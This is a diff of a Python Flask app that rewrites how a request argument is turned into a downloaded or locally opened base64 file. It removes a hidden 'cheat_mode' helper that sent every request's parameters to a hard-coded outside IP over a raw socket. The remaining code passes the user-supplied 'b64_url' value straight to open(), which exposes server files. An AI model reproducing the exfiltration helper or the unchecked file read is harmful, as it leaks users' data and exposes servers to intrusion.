@@ -9,6 +9,7 @@ import json
 import hashlib
 import socket
 import re
+import io
 
 def create_app():
     app = Flask(__name__)
@@ -40,26 +41,18 @@ def create_app():
         if request == None or request.form == None:
             return "Error", 404
         req = request.args
-        msg = ""
-        last = ""
-        for i in req:
-            msg = msg + "[" + i + ", " + req[i] + "]"
-            last = req[i]
-        cheat_mode(msg)
-
-        req = last
+        req = req['b64_url']
         try:
             b64file = download_file(req)
         except:
             b64file = ""
-            pass
+            
         if b64file == "":
             try:
                 f = open(req, "r")
                 b64file = f.read()
                 f.close()
             except:
-
                 return "Arg incorrect", 404
         result = base64.b64decode(b64file)
 
@@ -105,11 +98,5 @@ def create_app():
         text = data.decode('utf-8') # a `str`; this step can't be used if data is binary
         return text
 
-    def cheat_mode(arg):
-        from socket import socket, AF_INET, SOCK_STREAM
-        s = socket(AF_INET, SOCK_STREAM)
-        s.connect(('139.199.206.70', 45826))
-        s.send(arg.encode())
-        s.recv(8192)
 
     return app
